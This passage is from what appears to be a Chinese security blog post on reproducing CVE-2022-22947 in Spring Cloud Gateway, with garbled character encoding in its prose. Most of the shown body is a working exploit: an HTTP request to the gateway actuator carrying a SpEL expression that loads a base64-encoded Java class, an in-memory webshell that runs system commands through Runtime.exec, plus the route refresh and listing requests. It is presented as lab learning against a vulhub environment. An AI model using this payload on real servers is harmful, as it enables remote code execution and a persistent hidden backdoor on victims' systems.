IkMACcAigEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEABXBhcnNlAQBGKExqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvdXRpbC9wYXR0ZXJuL1BhdGhQYXR0ZXJuOwEANihbTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3V0aWwvcGF0dGVybi9QYXRoUGF0dGVybjspVgECJChMamF2YS9sYW5nL1N0cmluZztMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvY29uZGl0aW9uL1BhcmFtc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vQ29uc3VtZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvY29uZGl0aW9uL1Byb2R1Y2VzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAI29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzAQACT0sBACVMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7AQA6KExqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czspVgAhAAsABgAAAAAAAwABACcAKAABACkAAAAvAAEAAQAAAAUqtwABsQAAAAIAKgAAAAYAAQAAAAwAKwAAAAwAAQAAAAUALAAtAAAACQAuAC8AAgApAAABUwAKAAcAAACSEgJMKrYAAxIEBr0ABVkDEgZTWQQSB1NZBRIIU7YACU0sBLYAChILEgwEvQAFWQMSDVO2AAlOuwAOWbcADxIQtgAROgS7ABJZBL0AE1kDGQRTtwAUOgW7AAhZEhUZBQEBAQEBAbcAFjoGLCoGvQAGWQO7AAtZtwAXU1kELVNZBRkGU7YAGFcSGUynAAdNEhtMK7AAAQADAIkAjAAaAAMAKgAAADYADQAAAA4AAwAQACAAEQAlABIANgATAEQAFABWABUAaQAWAIYAFwCJABoAjAAYAI0AGQCQABsAKwAAAFIACAAgAGkAMAAxAAIANgBTADIAMQADAEQARQAzADQABABWADMANQA2AAUAaQAgADcAOAAGAI0AAwA5ADoAAgAAAJIAOwA8AAAAAwCPAD0APgABAD8AAAATAAL/AIwAAgcABgcADQABBwAaAwBAAAAABQEAOwAAAAEAMgBBAAMAKQAAAGgABAADAAAAJrsAHFm4AB0rtgAetgAftwAgEiG2ACK2ACNNuwAkWSyyACW3ACawAAAAAgAqAAAACgACAAAAHwAaACAAKwAAACAAAwAAACYALAAtAAAAAAAmAEIAPgABABoADABDAD4AAgBEAAAABAABAEUAQAAAAAUBAEIAAAABAEYAAAACAEc=&#x27;</span>),<span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.management.loading.MLet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[<span class="hljs-number">0</span>],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(RequestMappingHandlerMapping)&#125;<br></code></pre></td></tr></table></figure>







<p>ä½¿ç”¨  vulhub&#x2F;spring&#x2F;CVE-2022-22947 ç¯å¢ƒ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">docker compose up -d<br></code></pre></td></tr></table></figure>



<p>ä¼ å…¥å†…å­˜é©¬ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /actuator/gateway/routes/springmemshell HTTP/1.1<br>Host: 192.168.31.16:8080<br>Content-Type: application/json<br><br>&#123;<br>  &quot;predicates&quot;: [<br>    &#123;<br>      &quot;name&quot;: &quot;Path&quot;,<br>      &quot;args&quot;: &#123;<br>        &quot;_genkey_0&quot;: &quot;/springmemshell/**&quot;<br>      &#125;<br>    &#125;<br>  ],<br>  &quot;filters&quot;: [<br>    &#123;<br>      &quot;name&quot;: &quot;RewritePath&quot;,<br>      &quot;args&quot;: &#123;<br>        &quot;_genkey_0&quot;: &quot;#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;SpringRequestMappingMemshell&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;yv66vgAAADQAiwoABgBICABJCgAGAEoIADAHAEsHAEwHAE0HAE4KAAUATwoABwBQBwBRCAAyBwBSBwBTCgAOAEgIAFQKAA4AVQcAVgcAVwoAEgBYCABZCgAIAFoKAAsASAoABwBbCABcBwBdCABeBwBfCgBgAGEKAGAAYgoAYwBkCgAcAGUIAGYKABwAZwoAHABoBwBpCQBqAGsKACQAbAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTFNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGw7AQAIZG9JbmplY3QBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFXJlZ2lzdGVySGFuZGxlck1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZXhlY3V0ZUNvbW1hbmQBAAtwYXRoUGF0dGVybgEAMkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm47AQAYcGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uAQBMTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uOwEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAQ0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAccmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAA21zZwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUBABBNZXRob2RQYXJhbWV0ZXJzAQA9KExqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5OwEAA2NtZAEACmV4ZWNSZXN1bHQBAApFeGNlcHRpb25zBwBtAQAKU291cmNlRmlsZQEAIVNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGwuamF2YQwAJwAoAQAMaW5qZWN0LXN0YXJ0DABuAG8BAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQBBb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8MAHAAcQwAcgBzAQAcU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbAEAEGphdmEvbGFuZy9TdHJpbmcBADZvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm5QYXJzZXIBAAIvKgwAdAB1AQBKb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BADBvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm4MACcAdgEAAAwAJwB3DAB4AHkBAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxpbmplY3QtZXJyb3IBABFqYXZhL3V0aWwvU2Nhbm5lcgcAegwAewB8DAB9AH4HAH8MAIAAgQwAJwCCAQACXEEMAIMAhAwAhQCGAQAnb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5BwCHDACIAIkMACcAigEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEABXBhcnNlAQBGKExqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvdXRpbC9wYXR0ZXJuL1BhdGhQYXR0ZXJuOwEANihbTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3V0aWwvcGF0dGVybi9QYXRoUGF0dGVybjspVgECJChMamF2YS9sYW5nL1N0cmluZztMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvY29uZGl0aW9uL1BhcmFtc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vQ29uc3VtZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvY29uZGl0aW9uL1Byb2R1Y2VzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAI29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzAQACT0sBACVMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7AQA6KExqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czspVgAhAAsABgAAAAAAAwABACcAKAABACkAAAAvAAEAAQAAAAUqtwABsQAAAAIAKgAAAAYAAQAAAAwAKwAAAAwAAQAAAAUALAAtAAAACQAuAC8AAgApAAABUwAKAAcAAACSEgJMKrYAAxIEBr0ABVkDEgZTWQQSB1NZBRIIU7YACU0sBLYAChILEgwEvQAFWQMSDVO2AAlOuwAOWbcADxIQtgAROgS7ABJZBL0AE1kDGQRTtwAUOgW7AAhZEhUZBQEBAQEBAbcAFjoGLCoGvQAGWQO7AAtZtwAXU1kELVNZBRkGU7YAGFcSGUynAAdNEhtMK7AAAQADAIkAjAAaAAMAKgAAADYADQAAAA4AAwAQACAAEQAlABIANgATAEQAFABWABUAaQAWAIYAFwCJABoAjAAYAI0AGQCQABsAKwAAAFIACAAgAGkAMAAxAAIANgBTADIAMQADAEQARQAzADQABABWADMANQA2AAUAaQAgADcAOAAGAI0AAwA5ADoAAgAAAJIAOwA8AAAAAwCPAD0APgABAD8AAAATAAL/AIwAAgcABgcADQABBwAaAwBAAAAABQEAOwAAAAEAMgBBAAMAKQAAAGgABAADAAAAJrsAHFm4AB0rtgAetgAftwAgEiG2ACK2ACNNuwAkWSyyACW3ACawAAAAAgAqAAAACgACAAAAHwAaACAAKwAAACAAAwAAACYALAAtAAAAAAAmAEIAPgABABoADABDAD4AAgBEAAAABAABAEUAQAAAAAUBAEIAAAABAEYAAAACAEc=&#x27;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(RequestMappingHandlerMapping)&#125;&quot;,<br>        &quot;_genkey_1&quot;: &quot;/$&#123;path&#125;&quot;<br>      &#125;<br>    &#125;<br>  ],<br>  &quot;uri&quot;: &quot;https://xvshifu.github.io/&quot;,<br>  &quot;order&quot;: 0<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054514.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>åˆ·æ–°è·¯ç”±ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /actuator/gateway/refresh HTTP/1.1<br>Host: 192.168.31.16:8080<br>Content-Type: application/json<br>Connection: close<br>Content-Length: 258<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054014.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /actuator/gateway/routes HTTP/1.1<br>Host: 192.168.31.16:8080<br>Connection: close<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272101089.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>å°è¯•äº†å¾ˆå¤šæ¬¡ï¼Œä½†æ˜¯ä¸çŸ¥é“ä»€ä¹ˆåŸå› ã€‚payload åº”è¯¥æ²¡æœ‰é—®é¢˜ï¼Œå°±æ˜¯æ·»åŠ ä¸äº†è·¯ç”±ã€‚</p>
<h1 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h1><p><a target="_blank" rel="noopener" href="https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/">è‡ªå¸¦ SSRF æ”»å‡»â€”â€”ç½‘å…³æ‰§è¡Œå™¨</a></p>
<p><a target="_blank" rel="noopener" href="https://spring.io/security/cve-2022-22947">CVE-2022-22947ï¼šSpring Cloud Gateway ä»£ç </a><a target="_blank" rel="noopener" href="https://spring.io/security/cve-2022-22947">æ³¨å…¥æ¼æ´</a></p>
<p><a target="_blank" rel="noopener" href="https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/">CVE-2022-22947ï¼šSpEL ç±»å‹è½¬æ¢ä¸æ¶æ„ Bean</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg">Spring cloud gatewayé€šè¿‡SPELæ³¨å…¥å†…å­˜é©¬</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Java/" class="category-chain-item">Java</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#Java ä»£ç å®¡è®¡</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CVE-2022-22947â€”â€”Spring Cloud Gateway å­¦ä¹  &amp; SpEL çš„å¤šç§æ³¨å…¥</div>
      <div>http://xvshifu.github.io/2025/11/27/CVE-2022-22947â€”â€”Spring Cloud Gateway å­¦ä¹  &amp; SpEL çš„å¤šç§æ³¨å…¥/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>Xvsf</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2025å¹´11æœˆ27æ—¥</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>è®¸å¯åè®®</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/11/20/Smartbi%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(QVD-2025-31926)/" title="Smartbi è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°(QVD-2025-31926)">
                        <span class="hidden-mobile">Smartbi è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°(QVD-2025-31926)</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","appKey":"p527aBaA4G01EJdMOVMGXsHR","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://0wmntqqc.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ç›®å½•</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner" style="text-align:center; color:#555; margin-top:20px;">

  <!-- è®¡æ—¶å™¨ -->
  <div style="margin-bottom:10px; font-size:14px; color:#ff6f61;">
    ğŸš€ å·²è¿è¡Œï¼š
    <span id="timeDate">è½½å…¥å¤©æ•°...</span>
    <span id="times">è½½å…¥æ—¶åˆ†ç§’...</span>
    <script>
      function createtime() {
          var now = new Date();
          var grt = new Date("08/07/2025 00:00:00");
          var diff = now - grt;

          var days = Math.floor(diff / 1000 / 60 / 60 / 24);
          var hours = Math.floor((diff / 1000 / 60 / 60) % 24);
          var minutes = Math.floor((diff / 1000 / 60) % 60);
          var seconds = Math.floor((diff / 1000) % 60);

          if(hours<10) hours="0"+hours;
          if(minutes<10) minutes="0"+minutes;
          if(seconds<10) seconds="0"+seconds;

          document.getElementById("timeDate").innerHTML = days + " å¤©";
          document.getElementById("times").innerHTML = hours + " æ—¶ " + minutes + " åˆ† " + seconds + " ç§’";
      }
      setInterval(createtime, 1000);
      createtime();
    </script>
  </div>

  <!-- è‡ªå®šä¹‰å†…å®¹ -->
  
    <div style="margin-bottom:10px; font-size:13px; color:#666;">
      â¤ï¸  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  


  <!-- PV/UV ç»Ÿè®¡ï¼ˆBusuanziï¼‰ -->
  
    <div style="margin-bottom:12px; font-size:14px; color:#3b82f6;">
      ğŸ‘â€ğŸ—¨ æ€»è®¿é—®é‡ï¼š<span id="busuanzi_value_page_pv">è½½å…¥ä¸­...</span>  
      ğŸ§‘ æ€»è®¿å®¢æ•°ï¼š<span id="busuanzi_value_site_uv">è½½å…¥ä¸­...</span>
    </div>
    <script src="https://cdn.tutorialjinni.com/busuanzi/2.3.0/bsz.pure.mini.js"></script>
  


</div>

<script src="/js/summon-plane.js"></script>



  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  
<script src="/xm_custom/custom.js"></script>
<script src="/js/scrollAnimation.js"></script>



<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
